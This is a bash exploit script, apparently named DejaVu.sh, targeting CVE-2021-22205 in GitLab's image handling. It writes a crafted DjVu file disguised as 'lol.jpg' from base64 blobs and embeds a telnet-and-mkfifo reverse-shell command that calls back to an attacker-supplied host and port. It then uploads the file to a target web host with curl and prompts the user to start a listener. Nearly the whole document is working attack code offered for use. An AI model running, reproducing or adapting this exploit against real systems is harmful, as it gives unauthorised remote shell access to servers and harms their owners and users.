#!/bin/bash
#CVE: CVE-2021-22205

echo -e '\E[31;40m'" _____ _____  _____    ______ _____   ___  ___  _   _ _   _ "
echo -e '\E[32;40m'"|  _  |  __ \/  __ \   |  _  \  ___| |_  |/ _ \| | | | | | |"
echo -e '\E[33;40m'"| | | | |  \/| /  \/   | | | | |__     | / /_\ \ | | | | | |"
echo -e '\E[34;40m'"| | | | | __ | |       | | | |  __|    | |  _  | | | | | | |"
echo -e '\E[35;40m'"\ \_/ / |_\ \| \__/\   | |/ /| |___/\__/ / | | \ \_/ / |_| |"
echo -e '\E[36;40m'" \___/ \____/ \____/   |___/ \____/\____/\_| |_/\___/ \___/ "
echo -e '\E[37;40m'"                                                            ";tput sgr0

############################################################
# Help                                                     #
############################################################
Help()
{
   # Display Help
   echo "-l     LHOST"
   echo "-p     LPORT"
   echo "-w     WEBSITE"
   echo "Syntax: ./DejaVu.sh -l <lhost> -p <lport> -w <WEBHOST>"
   echo "ex: ./DejaVu.sh -l 10.10.10.10 -p 4444 -w http://test.com:8080"
}

############################################################
############################################################
# Main program                                             #
############################################################
############################################################

############################################################
# Process the input options. Add options as needed.        #
############################################################
# Get the options
while getopts "l:p:w:h" option; do
   case $option in
   	h) # display Help
	    Help
        exit;;
    l) # LHOST
		LHOST=${OPTARG};;
	p) # LPORT
		LPORT=${OPTARG};;
	w) # WEBHOST
		WEBHOST=${OPTARG};;
   esac
done

############################################################
# If no options are passed do the following        		   #
############################################################

if [ $# -eq 0 ]; then
    >&2 echo -e '\E[31;40m' "No arguments provided"
    >&2 echo -e '\E[33;40m' "Use -h for help"
    >&2 echo -e '\E[32;40m' "Syntax: ./DejaVu.sh -l <lhost> -p <lport> -w <WEBHOST>"
    >&2 echo -e '\E[37;40m' "Example: ./DejaVu.sh -l 10.10.10.10 -p 4444 -w http://test.com:8080"
    exit 1
fi

if [[ $LHOST -eq 0 ]]; then
	>&2 echo -e '\E[31;40m' "No LHOST"
	>&2 echo -e '\E[33;40m' "Use -h for help"
	>&2 echo -e '\E[32;40m' "Syntax: ./DejaVu.sh -l <lhost> -p <lport> -w <WEBHOST>"
    >&2 echo -e '\E[37;40m' "Example: ./DejaVu.sh -l 10.10.10.10 -p 4444 -w http://test.com:8080"
    exit 1
fi

if [[ $LPORT -eq 0 ]]; then
	>&2 echo -e '\E[31;40m' "No LPORT"
	>&2 echo -e '\E[33;40m' "Use -h for help"
	>&2 echo -e '\E[32;40m' "Syntax: ./DejaVu.sh -l <lhost> -p <lport> -w <WEBHOST>"
    >&2 echo -e '\E[37;40m' "Example: ./DejaVu.sh -l 10.10.10.10 -p 4444 -w http://test.com:8080"
    exit 1
fi

if [[ $WEBHOST -eq 0 ]]; then
	>&2 echo -e '\E[31;40m' "No WEBHOST"
	>&2 echo -e '\E[33;40m' "Use -h for help"
	>&2 echo -e '\E[32;40m' "Syntax: ./DejaVu.sh -l <lhost> -p <lport> -w <WEBHOST>"
    >&2 echo -e '\E[37;40m' "Example: ./DejaVu.sh -l 10.10.10.10 -p 4444 -w http://test.com:8080"
    exit 1
fi

TF=$(mktemp -u)

echo -e '\E[31;40m'"Making lol.jpg file"; tput sgr0
echo -e 'QVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHs=' | base64 -d > lol.jpg
echo -n "mkfifo $TF && telnet $LHOST $LPORT 0<$TF | sh 1>$TF" >> lol.jpg
echo -n "fSAuIFwKIiBiICIpICkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==" | base64 -d >> lol.jpg
echo -e '\E[32;40m'"Sending lol.jpg to $WEBHOST";tput sgr0

read -p "Start listener on $LHOST with port $LPORT, press enter when ready"
curl -v -F 'file=@lol.jpg' "$WEBHOST/$(openssl rand -hex 8)"
